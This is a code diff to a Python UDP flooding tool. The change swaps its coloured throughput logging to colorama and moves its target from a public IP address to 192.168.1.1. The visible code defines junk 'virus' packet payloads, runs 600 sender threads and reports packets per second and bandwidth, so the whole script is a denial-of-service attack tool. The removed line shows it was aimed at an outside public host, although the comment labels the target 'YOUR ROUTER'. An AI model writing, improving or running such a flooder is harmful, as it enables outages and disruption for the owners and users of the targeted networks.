@@ -3,16 +3,23 @@ import threading
 import time
 import random
 import struct
+from colorama import Fore, Back, Style, init
 
-TARGET_IP = "62.109.121.42"  # YOUR ROUTER
+# Initialize colorama
+init(autoreset=True)
 
-# ==================== COLORS ====================
-YELLOW = '\033[93m'
-GREEN = '\033[92m'
-RED = '\033[91m'
-RESET = '\033[0m'
+TARGET_IP = "192.168.1.1"  # YOUR ROUTER
 
-# ==================== STS VIRUS HEADERS (ASCII ONLY) ====================
+# ==================== COLORAMA COLORS ====================
+SK1_COLOR = Fore.YELLOW  # yellow_to_green = YELLOW
+PPS_HIGH_COLOR = Fore.GREEN  # green_to_yellow = GREEN for high
+PPS_LOW_COLOR = Fore.YELLOW  # green_to_yellow = YELLOW for low
+BW_HIGH_COLOR = Fore.GREEN  # above 100 = GREEN
+BW_MID_COLOR = Fore.YELLOW  # above 100 = YELLOW if lower
+BW_LOW_COLOR = Fore.YELLOW  # under 100 = YELLOW
+BW_VERY_LOW_COLOR = Fore.RED  # under 100 = RED if very low
+
+# ==================== STS VIRUS HEADERS ====================
 PPS_VIRUSES = [
     b'STS-RAPID\x00' + random.randbytes(56),
     b'STARSHIP-PPS\x00' + b'\xDE\xAD' * 26,
@@ -74,7 +81,6 @@ UDP_RAPID_BW = 150
 UDP_BW = 150
 TOTAL_THREADS = 600
 
-# Global counters
 total_packets = 0
 total_bytes = 0
 
@@ -180,31 +186,7 @@ for i in range(UDP_BW):
     t.daemon = True
     t.start()
 
-# ==================== COLORED LOGGING ====================
-def get_pps_color(pps):
-    """GREEN to YELLOW for PPS"""
-    if pps > 80000:
-        return f"{GREEN}{pps:,}{RESET}"
-    elif pps > 50000:
-        return f"{GREEN}{pps:,}{RESET}"
-    elif pps > 30000:
-        return f"{YELLOW}{pps:,}{RESET}"
-    else:
-        return f"{YELLOW}{pps:,}{RESET}"
-
-def get_bw_color(mbps):
-    """GREEN to YELLOW if above 100, YELLOW to RED if under 100"""
-    if mbps >= 100:
-        if mbps > 150:
-            return f"{GREEN}{mbps:.1f}{RESET}"
-        else:
-            return f"{YELLOW}{mbps:.1f}{RESET}"
-    else:
-        if mbps > 50:
-            return f"{YELLOW}{mbps:.1f}{RESET}"
-        else:
-            return f"{RED}{mbps:.1f}{RESET}"
-
+# ==================== LOGGING WITH COLORAMA ====================
 last_log = time.time()
 
 while True:
@@ -221,9 +203,27 @@ while True:
     total_packets = 0
     total_bytes = 0
     
-    # Colored logging
-    colored_pps = get_pps_color(pps)
-    colored_bw = get_bw_color(mbps)
+    # Color selection using colorama
+    # SK1-SSALG = yellow (always)
+    sk1_display = f"{SK1_COLOR}SK1-SSALG{Style.RESET_ALL}"
     
-    # SK1-SSALG in yellow_to_green
-    print(f"{YELLOW}SK1-SSALG{RESET} | {colored_pps}/s | {colored_bw}Mbps")
+    # PPS = green_to_yellow
+    if pps >= 50000:
+        pps_display = f"{PPS_HIGH_COLOR}{pps:,}{Style.RESET_ALL}"
+    else:
+        pps_display = f"{PPS_LOW_COLOR}{pps:,}{Style.RESET_ALL}"
+    
+    # Bandwidth = above 100 green_to_yellow, under 100 yellow_to_red
+    if mbps >= 100:
+        if mbps >= 150:
+            bw_display = f"{BW_HIGH_COLOR}{mbps:.1f}{Style.RESET_ALL}"
+        else:
+            bw_display = f"{BW_MID_COLOR}{mbps:.1f}{Style.RESET_ALL}"
+    else:
+        if mbps >= 50:
+            bw_display = f"{BW_LOW_COLOR}{mbps:.1f}{Style.RESET_ALL}"
+        else:
+            bw_display = f"{BW_VERY_LOW_COLOR}{mbps:.1f}{Style.RESET_ALL}"
+    
+    # Print with colorama colors
+    print(f"{sk1_display} | {pps_display}/s | {bw_display}Mbps")
